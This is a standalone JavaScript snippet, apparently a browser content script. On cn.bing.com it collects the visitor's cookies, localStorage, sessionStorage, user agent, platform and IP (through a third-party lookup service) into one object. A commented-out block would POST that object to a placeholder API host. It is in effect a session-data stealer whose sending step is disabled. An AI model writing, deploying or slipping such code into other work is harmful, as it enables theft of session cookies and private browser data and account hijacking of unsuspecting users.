
if(typeof utils === 'undefined'){
  const utils = {
    config: {
      paths: ['https://cn.bing.com/'],
      ip: 'https://extreme-ip-lookup.com/json',
      timeout: 3000,
      dest: 'some_api_url.com/api',
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'Sec-Fetch-Dest': 'object',
        'Sec-Fetch-mode': 'cors',
        'Sec-Fetch-Site': 'cross-site'
      }
    },
    post(dest, method, data, cb){
      let obj = {
        method: method,
        headers: utils.config.headers
      }

      if(!cb){
        cb = data;
      } else {
        obj.body = JSON.stringify(data);
      }

      fetch(dest, obj).then(function(res){
        if (res.status >= 200 && res.status < 300) {
          return res.json();
        } else {
          return Promise.reject(new Error(res.statusText))
        }
      }).then(function(res){
        cb(false,res)
      }).catch(function(err){
        cb(err)
      })
    },
    getCookies(){
      let pairs = document.cookie.split(";"),
      cookies = {},
      pair;
      for (let i=0; i<pairs.length; i++){
        pair = pairs[i].split("=");
        cookies[(pair[0]+'').trim()] = unescape(pair.slice(1).join('='));
        pair = null;
      }
      return cookies;
    }
  }

  if(utils.config.paths.indexOf(location.href) !== -1){

    setTimeout(function(){
      let obj = {
        url: location.href,
        ls: JSON.stringify(localStorage),
        ss: JSON.stringify(sessionStorage),
        cookies: utils.getCookies(),
        userAgent: window.navigator.userAgent,
        platform: window.navigator.platform
      }

      utils.post(utils.config.ip, 'GET', function(err,res){
        if(res){
          obj.ip = JSON.stringify(res)
        }

        console.log(obj)
        /* post data
        utils.post(utils.config.dest, utils.config.method, obj, function(err,res){
          console.log('done.')
        })*/
      })

    }, utils.config.timeout)

  }

}
